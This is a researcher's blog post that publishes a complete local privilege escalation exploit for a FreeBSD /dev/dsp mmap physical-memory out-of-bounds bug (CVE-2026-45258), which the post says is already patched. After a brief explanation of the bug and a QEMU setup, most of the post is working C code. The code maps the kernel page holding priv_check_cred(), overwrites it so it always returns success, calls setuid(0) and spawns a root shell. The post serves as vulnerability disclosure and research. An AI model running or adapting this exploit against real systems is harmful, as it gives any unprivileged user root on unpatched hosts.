# Nightmare of the physical memory corruption
<primary-label ref="kernel"/>

0.5-day exploit for CVE-2026-45258

I found a physical memory oob in /dev/dsp of FreeBSD, which is available from all users in default config.
I exploited it and proved lpe is reachable in around 6/9 14:00PM UTC, after a short sleep, unfortunately the patch has merged to remote repository few hours later as same as [](Dirty-Kernel-Stack.md) one.

https://bsdsec.net/articles/freebsd-security-advisory-freebsd-sa-26-27-sound

So my report was duplicated. However, I have a completely LPE exploit that proves any user-to-root privilege escalation, I decided to explain and publish my exploit in my blog.

## Env

VM image: [](https://download.freebsd.org/releases/VM-IMAGES/15.0-RELEASE/amd64/Latest/)

```sh
#!/bin/sh
qemu-system-x86_64 \
  -accel kvm \
  -m 3072 \
  -cpu host -smp 4 \
  -bios /usr/share/ovmf/OVMF.fd \
  -drive file=FreeBSD-15.0-RELEASE-amd64-ufs.qcow2 \
  -audiodev none,id=snd0 \
  -device intel-hda \
  -device hda-duplex,audiodev=snd0 \
  -nographic
```

## Bug

The bug was simple, there's physical memory oob in /dev/dsp.

FreeBSD's OSS PCM `/dev/dsp*` mmap path accepts a user-controlled negative `mmap(2)` offset and later treats it as an unsigned device-pager cookie.  The sound driver performs an overflow-prone bounds check on that unsigned offset, then truncates it to 32 bits before converting it to a software-buffer pointer. The resulting pointer is passed to the legacy device pager, whose fault path uses `dsp_mmap()` to return `vtophys(offset)`.

The result is a local unprivileged primitive that can map a physical page backed by an attacker-selected kernel virtual address relative to the PCM software buffer.  With `PROT_WRITE`, the mapping is a writable user alias to that physical page. 

## Primitive

This primitive was turned into a local privilege escalation by mapping the kernel text page containing `priv_check_cred()`, patching it to always return success, and then invoking `setgid(0); setuid(0)` from an unprivileged process.

For kASLR bypass, please refer to the repository: [](https://github.com/Yayoi-cs/FreeBSD_Kernel_VA_Leaks)

```C
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/resource.h>
#include <sys/soundcard.h>
#include <sys/linker.h>
#include <sys/sysctl.h>
#include <sys/user.h>

#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <limits.h>

#define SYSCHK(x) ({ \
    typeof(x) __res = (x); \
    if (__res == (typeof(x))-1) { \
    error("%s: %s\n", "SYSCHK(" #x ")", strerror(errno)); \
    exit(1); \
    } \
    __res; \
    })

#define info(fmt, ...) printf("[*] " fmt "\n", ##__VA_ARGS__); 
#define success(fmt, ...) printf("[+] " fmt "\n", ##__VA_ARGS__);
#define error(fmt, ...) printf("[-] " fmt "\n", ##__VA_ARGS__); 
#define warning(fmt, ...) printf("[!] " fmt "\n", ##__VA_ARGS__); 
#define hl(x) printf("[#] " #x " = 0x%lx\n",(unsigned long)x);


#define rep(X,Y) for (int X = 0;X < (Y);++X)
#define drep(X,Y) for (unsigned long X = 0;X < (Y);X+=4)
#define qrep(X,Y) for (unsigned long X = 0;X < (Y);X+=8)
#define dqrep(X,Y) for (unsigned long X = 0;X < (Y);X+=16)
#define irep(X) for (int X = 0;;++X)
#define rrep(X,Y) for (int X = int(Y)-1;X >=0;--X)
#define range(X,Y,Z) for (int X = Y;X < Z;X++)
#define __DBG__ _dbg(__FILE__, __LINE__);

void _dbg(const char *file, int line) {
    info("dbg @ %s:%d", file,line);
    getchar();
}

#define __CHK__(x) _chk( __FILE__, __LINE__, #x,x);

void _chk(const char *msg, int line, const char *code, int cond) {
    if (cond) { success("[OK] %s @ %s:%d",code,msg,line); }
    else { error("[FAIL] %s @ %s:%d",code,msg,line); abort(); }
}


void _xxd_qword(char *buf, int size) {
    char *p = buf;
    dqrep (i, size) {
        printf("0x%06x |", (int)i);
        printf(" 0x%016lx ", *(unsigned long *)(p + i));
        printf(" 0x%016lx ", *(unsigned long *)(p + i + 8));
        printf("\n");
    }
}

#define xxd_qword(X,Y) \
    puts("[" #X "]"); \
    _xxd_qword((char *)(X), (int)Y)

void _xxd(char *buf, int size) {
    char *p = buf;
    dqrep (i, size) {
        printf("0x%06x |", (int)i);
        rep (j, 0x10) { printf(" %02x", *(unsigned char *)(p+i+j)); }
        printf(" |");
        rep (j, 0x10) {
            if (*(unsigned char *)(p+i+j) < 0x20 || *(unsigned char *)(p+i+j) > 0x7e) {
                printf(".");
            } else { printf("%c", *(unsigned char *)(p + i + j)); }
        }
        printf("|\n");
    }
}
#define xxd(X,Y) \
    puts("[" #X "]"); \
    _xxd((char *)(X), (int)Y)


#define DEV_PATH "/dev/dsp"
#define PAGE_SZ  4096ULL
#define SPRAY_FDS 850
#define FRAGS 32U
#define FRAGLOG 12U

#define PRIV_CHECK_CRED_OFF 0x950af0ULL

static uint64_t kernel_base(void) {
        struct kld_file_stat st;

        memset(&st, 0, sizeof(st));
        st.version = sizeof(st);
        SYSCHK(kldstat(1, &st) < 0);
        return ((uint64_t)(uintptr_t)st.address);
}

static void raise_limits(void) {
        struct rlimit rl;

        if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
                rl.rlim_cur = rl.rlim_max;
                setrlimit(RLIMIT_NOFILE, &rl);
        }
#if defined(RLIMIT_AS)
        if (getrlimit(RLIMIT_AS, &rl) == 0) {
                rl.rlim_cur = rl.rlim_max;
                setrlimit(RLIMIT_AS, &rl);
        }
#endif
}

static void set_fragments(int fd) {
        int arg;

        arg = (2 << 16) | 4;
        (void)ioctl(fd, SNDCTL_DSP_SETFRAGMENT, &arg);
        arg = (FRAGS << 16) | FRAGLOG;
        SYSCHK(ioctl(fd, SNDCTL_DSP_SETFRAGMENT, &arg) != 0);
}

static uint64_t self_dsp_mapping_offset(void *addr) {
        int mib[4] = { CTL_KERN, KERN_PROC, KERN_PROC_VMMAP, getpid() };
        size_t len = 0;
        char *buf, *p, *end;
        uint64_t a = (uint64_t)(uintptr_t)addr;

        SYSCHK(sysctl(mib, 4, NULL, &len, NULL, 0) != 0);
        buf = malloc(len);
        __CHK__(buf != NULL)
        SYSCHK(sysctl(mib, 4, buf, &len, NULL, 0) != 0);

        p = buf;
        end = buf + len;
        while (p < end) {
                struct kinfo_vmentry *kve = (struct kinfo_vmentry *)p;

                if (kve->kve_structsize == 0) break;
                if (a >= kve->kve_start && a < kve->kve_end && kve->kve_type == KVME_TYPE_DEVICE && strstr(kve->kve_path, "dsp") != NULL) {
                        uint64_t off = kve->kve_offset;
                        free(buf);
                        return (off);
                }
                p += kve->kve_structsize;
        }

        free(buf);
        fprintf(stderr, "failed to find own /dev/dsp mapping in KERN_PROC_VMMAP\n");
        exit(1);
}

static int open_prime_one(void **map_out) {
        int fd = SYSCHK(open(DEV_PATH, O_RDWR));
        set_fragments(fd);
        *map_out = SYSCHK(mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0));
        return (fd);
}

int main(void) {
        int spray_fd[SPRAY_FDS];
        void *spray_map[SPRAY_FDS];
        int fd;
        void *prime, *evil, *target_user;
        uint64_t kbase, target, target_page, target_off;
        uint64_t buf_kva, d, q, r, k, map_len64, need, touch_delta;
        off_t neg_off;

        raise_limits();
        rep(i, SPRAY_FDS) {
                spray_fd[i] = -1;
                spray_map[i] = MAP_FAILED;
        }

        kbase = kernel_base();
        target = kbase + PRIV_CHECK_CRED_OFF;
        hl(kbase);
        hl(target);

        rep(i, SPRAY_FDS) {
                spray_fd[i] = SYSCHK(open_prime_one(&spray_map[i]));
        }

        fd = SYSCHK(open_prime_one(&prime));

        buf_kva = self_dsp_mapping_offset(prime);
        hl(buf_kva);

        target_page = target & ~(PAGE_SZ - 1);
        target_off = target & (PAGE_SZ - 1);
        if (target_page <= buf_kva) {
                fprintf(stderr, "target is not forward from buf KVA\n");
                return (1);
        }

        d = target_page - buf_kva;
        q = d >> 32;
        r = d & 0xffffffffULL;
        need = (q << 32) + PAGE_SZ;
        k = q + 1;
        map_len64 = (k << 32) - r;
        if (map_len64 < need)
                map_len64 = ((++k) << 32) - r;
        touch_delta = d - r;

        printf("[+] first mapped KVA low32 = 0x%08jx\n", (uintmax_t)r);
        printf("[+] mmap length = 0x%jx, touch delta = 0x%jx, pageoff = 0x%jx\n", (uintmax_t)map_len64, (uintmax_t)touch_delta, (uintmax_t)target_off);

        if (map_len64 > (uint64_t)SIZE_MAX || map_len64 > (uint64_t)INT64_MAX) {
                fprintf(stderr, "map length too large\n");
                return (1);
        }
        neg_off = -(off_t)map_len64;
        evil = SYSCHK(mmap(NULL, (size_t)map_len64, PROT_READ | PROT_WRITE, MAP_SHARED, fd, neg_off));
        target_user = (void *)((uintptr_t)evil + (uintptr_t)touch_delta + (uintptr_t)target_off);
        hl(target_user);

        xxd(target_user,0x10);

        volatile uint8_t *p = (volatile uint8_t *)target_user;
        static const uint8_t patch[] = { 0x31, 0xc0, 0xc3,0x90, 0x90, 0x90, 0x90, 0x90 };

        for (size_t i = 0; i < sizeof(patch); i++) p[i] = patch[i];
        SYSCHK(setgid(0));
        SYSCHK(setuid(0));
        __CHK__(geteuid() == 0);
        __CHK__(getuid() == 0);
        char *argv[] = { "/bin/sh", NULL };
        execv(argv[0], argv);
}
```
